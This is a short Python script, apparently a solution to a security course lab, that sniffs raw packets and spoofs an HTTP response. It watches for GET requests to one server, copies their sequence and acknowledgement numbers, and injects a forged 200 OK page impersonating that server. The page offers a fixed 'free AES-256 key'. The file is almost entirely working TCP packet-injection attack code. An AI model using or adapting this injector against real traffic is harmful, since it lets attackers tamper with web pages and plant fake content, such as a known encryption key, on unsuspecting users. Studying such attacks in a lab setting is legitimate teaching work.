#!/usr/bin/python3

import scapy
from scapy.all import send, conf, L3RawSocket

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    identifyServer = str(pkt[30])+"."+str(pkt[31])+"."+str(pkt[32])+"."+str(pkt[33])
    if identifyServer == "18.234.115.5" and pkt.find(b'GET')!=-1:   
        numberSeq = int(pkt[38:42].hex(),16)
        numberAck = int(pkt[42:46].hex(),16)
        portDestination = int(pkt[34:36].hex(),16)
        final_IP =  str(pkt[26])+"."+str(pkt[27])+"."+str(pkt[28])+"."+str(pkt[29])
        payloadFinal = 'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
        packet = IP(src="18.234.115.5", dst=final_IP)/TCP(sport=80, dport=portDestination, flags="PA", seq = numberAck , ack=numberSeq+1)/payloadFinal
        inject_pkt(packet)

def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
